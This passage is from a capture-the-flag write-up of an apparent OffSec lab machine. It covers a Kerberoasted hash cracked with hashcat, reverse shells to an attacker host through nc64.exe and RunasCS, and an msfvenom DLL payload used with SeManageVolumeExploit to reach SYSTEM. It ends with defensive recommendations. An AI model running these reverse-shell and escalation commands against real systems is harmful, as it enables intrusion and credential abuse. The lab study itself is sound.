$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$21038308e953f1178c9257edd1e21eaf$ac40e65ce4ca7ef5fffe63865f1d9bc81397ba4231c8ab2bfebdc8b60340fb749406dc23ebe1a3ff4ac0c9e2904141dce6507b306801ed085fa315c522bbaef4b9eeab579382ad3d0d729428cc46dd355e52f49ab2f2bd2b71f0f0d254747b14ad2c0725e6e727dd10e72bdd03867508627c6325debb4f4c93a63c2326a18d03fecb990866fc60e3eb1bf6ea98e792b6d75fd8bd2eb245fd83d9528d40b6edecb3c8333a0732f6fd128ebbdd32b3f65d1ae4645a8e5593e465c8943084d30b00c9d8cef708cb2d3bd441206962fbd39e001af4a39465139b44976249de9bac5d78b017929cd48f4232c72831f7ac2a289ef742fe2e0795944f5d0964b6128d6a26f1276b64870c3096733c33b3fec5bb69bf164c03843410963ae458e99cd18d170f06247c0b6967faf6f3d32bc0a6aa4f26d7a0c0c622516b34da99bcbb764042f3a27a74c62734460e207d03397f7e673bbb45339e61cfbfe391ef26d00e687dddcef74db68f15c8cb5121bf54dfcad1e086d2fc02135c3e39b93407f65f087a8231cdf2799701c551d66fdbff6f75bd3eb353a8d4bf4baaff8c8a61fdd191cfc70675491fa925486f8270708c26e4d5118a62a41dd808ccf3fa3bbd02cb2b55f5b8e02339b390e2c1220d9b6b0c6a609b16a4ca560c0bb667642c031256f8320623a9678b935bfb6d42ed2d01674ac67afd74c222ac4253eb8c8d0635d7255531a0a4959bc702b8cdf6814c385956372ff41f2b23e54ea08dc6a75b8d3854e3c7c6e051a5faf75f805710615f1cc68c8e5a24ecc332c805087ff4b0cc2bdcccf0467d6b85ed88b9fd1879de3d1d702a5b0552d75ee363bf64e65b3bd0388c34ef9c8e59f0c739b8b746d59ca124e46cffe3b05002f98792d4f98afe8aef27cc2d5acdbd28fa826e3f43361cc50ab01c71bf8f5ed33548af545e8836908035bc3aa518503ff23ec885c6537713f954c7dbd79c0329468a64af7288925b767274094a44aa60dd3bc5124a7a7e12d99ed35f53dc72b05a2709636fe4e34e6f1a559e11e72cddd82ee0b063d09678f8cc881f0126e04de161ddaa29be3de340537dd16560bf3510c90e724374ac796cadb845a30eb9a03e1108eebf86847ceb33d8ae83a9525ac263b20e97a37c67dc8baf0ef1d93ed6cbbd69db77b6a968fe9f1002f2aab4011f2c3cf11582dac26b5e52df4c1e031ceb8c76b6d22f54b78b53b9d6e9d963b27facc300997515dcf0f4d25397cfe41b7696d1663f496e0c8f30d2139e8ec77233822fe79646cba22abd91908a3eae67e114f15f9a492b7512826e0cb0ed1f3c7f6a42576fa923289c5f6cf86f7b5a072badbc68687b7b4c24d7aa26a2b6e3374481ab8f7c6710904e7c959ccf58cf24f21f669ff7f3fe2ef2ffc8769cc96e6d2ee8beba05ab642376fe8f2aed7d38f61a6bef913911adb6d917272e95fb7c7c5a59c84d3519cc4942355ad65d1bd550c21f89de9c8f7b4aaa701b43f14959e1a6f108d4ddf52e702e0bb58039dbf5ab9eeaade3e1b9f029ad383babaa010e67993d2f4f8c5919764e1bd82abe467eeab4891d705423fb3713c28937a796991027f0a5025d2ae3433f69e1a4:trustno1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.ac...69e1a4
Time.Started.....: Tue Dec 02 15:50:18 2025, (0 secs)
Time.Estimated...: Tue Dec 02 15:50:18 2025, (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#03........:   792.6 kH/s (12.12ms) @ Accel:53 Loops:1 Thr:32 Vec:1
Speed.#*.........:   792.6 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13568/14344384 (0.09%)
Rejected.........: 0/13568 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#03..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#03...: 123456 -> stress
Hardware.Mon.#03.: N/A

Started: Tue Dec 02 15:49:34 2025
Stopped: Tue Dec 02 15:50:20 2025
```

Upload a `nc64.exe` and `RunasCS.exe` through port 80 http and try to execute command as `svc_mssql:trustno1` user and get a reverse shell. 

```
---Terminal 1---
C:\Users\svc_apache\Downloads> dir

    Directory: C:\Users\svc_apache\Downloads

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        12/2/2025   7:43 AM           2389 hashes.kerberoast                                                     
-a----        12/2/2025   7:21 AM         441344 Rubeus.exe                                                            
-a----        12/2/2025   8:43 AM          51712 RunasCS.exe                                                           
-a----        12/2/2025   7:22 AM        1308348 SharpHound.ps1                                                        

PS C:\Users\svc_apache\Downloads> .\RunasCS.exe 'svc_mssql' 'trustno1' 'cmd.exe /c C:\xampp\htdocs\uploads\nc64.exe -e powershell 192.168.45.170 50506'
...
...
...

---Terminal 2---
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ rlwrap nc -lnvp 50506
listening on [any] 50506 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.133.187] 50671
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
access\svc_mssql
```

```
PS C:\Users\svc_mssql\Desktop> dir
dir

    Directory: C:\Users\svc_mssql\Desktop

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        12/2/2025   5:49 AM             34 local.txt                                                             

PS C:\Users\svc_mssql\Desktop> type local.txt
type local.txt
f86a3c19a0e7a62f495c7d16bd663f54
```

`whoami /priv` command gives interesting permission set `SeManageVolumePrivilege` which a bunch of article available for privilege escalation on the internet.

```
PS C:\Windows\system32> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
```

![image.png]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image11.png)

[Exploit Repository: SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)

[Exploit Release file](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public)

[Reference 1](https://www.youtube.com/watch?v=gVLoHAl-8Z0)

[Reference 2](https://sirensecurity.io/blog/windows-privilege-escalation-resources/)

[Reference 3](https://decoder.cloud/2023/02/16/eop-via-arbitrary-file-write-overwite-in-group-policy-client-gpsvc-cve-2022-37955/)

[Reference 4](https://oscp.adot8.com/windows-privilege-escalation/whoami-priv/semanagevolumeprivilege)

After visiting few articles and github repository found a ready to execute exploit which I transferred into the victim’s system and execute it. 

```
┌──(kali㉿kali)-[~/offsec/Practice/Access/exploit]
└─$ wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
--2025-12-02 12:41:31--  https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
...
...
...
Length: 12288 (12K) [application/octet-stream]
Saving to: ‘SeManageVolumeExploit.exe’

SeManageVolumeExploit.exe                  100%[========================================================================================>]  12.00K  --.-KB/s    in 0.002s  

2025-12-02 12:41:31 (5.11 MB/s) - ‘SeManageVolumeExploit.exe’ saved [12288/12288]

┌──(kali㉿kali)-[~/offsec/Practice/Access/exploit]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.170 LPORT=50505 -f dll -o Printconfig.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: Printconfig.dll
                                                                                                                                                                            
┌──(kali㉿kali)-[~/offsec/Practice/Access/exploit]
└─$ ls
NTLMTheft  Printconfig.dll  revshell.php  SeManageVolumeExploit.exe
```

```
---Terminal 1---
PS C:\Users\svc_mssql\Downloads> .\SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe
Entries changed: 917
DONE

PS C:\Users\svc_mssql\Downloads> copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\
copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\

PS C:\Users\svc_mssql\Downloads> $type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")

PS C:\Users\svc_mssql\Downloads> $object = [Activator]::CreateInstance($type)
$object = [Activator]::CreateInstance($type)
...
...
...

---Terminal 2---
┌──(kali㉿kali)-[~/offsec/Practice/Access/exploit]
└─$ rlwrap nc -lnvp 50505            
listening on [any] 50505 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.133.187] 49896
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd \Users\Administrator\Desktop
cd \Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
06809952ad4cff272ff4772bf3b9660b
```

## Recommendations

1. Enforce strict file upload validation and disable `.htaccess` overrides.
2. Enforce strong passwords for service accounts.
3. Monitor and restrict Kerberos SPN usage.
4. Audit and remove unnecessary Windows privileges.
5. Implement regular Active Directory security reviews.

## Conclusion

The compromise resulted from multiple layered misconfigurations across the web application and Active Directory environment. Correcting these weaknesses would significantly reduce the attack surface.